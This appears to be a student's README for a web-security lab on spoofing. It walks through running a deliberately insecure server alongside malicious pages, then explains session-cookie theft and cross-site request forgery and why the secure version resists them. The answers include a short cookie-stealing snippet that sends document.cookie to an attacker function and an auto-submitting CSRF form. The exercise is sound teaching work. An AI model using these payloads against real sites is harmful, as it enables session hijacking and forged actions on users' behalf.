# Spoofing

This example demonstrates spoofind through two ways -- Stealing cookies programmatically and cross site request forgery (CSRF).

## Steps to reproduce the vulnerability

1. Install dependencies

    `$ npx install`

2. Start the **insecure.ts** server

    `npx ts-node insecure.ts`

3. Start the malicious server **mal.ts**

    `npx ts-node mal.ts`

4. Open __http://localhost:8000__ in a browser, type a name and Submit.

5. Open the __Application__ tab in the Browser's inspect pane. Find the __Cookies__ under __Storage__. You should see a __connect.sid__ cookie being set.

6. Open the HTML file __mal-steal-cookie.html__ file in the same browser (different tab). Open inspect and view the console.

7. Click the link in the HTML file. Do you see the cookie being stolen in the console?

8. Open the HTML file __mal-csrf.html__ file in the same browser (different tab). What do you see if the user has not logged out of **insecure.ts**? What do you see if the user has logged out? 


## For you to answer

1. Briefly explain the spoofing vulnerability in **insecure.ts**.
The application is vulnerable to cross-site request forgery attacks since there is no CSRF protection implemented. Also, the session cookie is set with httpOnly: false, this allows client-side JavaScript to access the session cookie through document.cookie.
2. Briefly explain different ways in which vulnerability can be exploited.
ways this could be exploited:
    (1)XSS could be used to steal the session cookie. ex:
        let stolenCookie = document.cookie;
        sendToAttackerServer(stolenCookie);
    (2)CSRF attack:
        <form id="hack" action="http://targetsite:8000/register" method="POST">
        <input type="hidden" name="name" value="Admin">
    </form>
    <script>document.getElementById('hack').submit();</script>
3. Briefly explain why **secure.ts** does not have the spoofing vulnerability in **insecure.ts**.
**secure.ts** have httpOnly: true, which prevents client-side JavaScript from accessing the session cookie through document.cookie. And sameSite: true helps prevent CSRF attacks by ensuring the cookie is only sent in same-site requests. Also, the session secret is passed as a command line argument rather than being hardcoded as "SOMESECRET".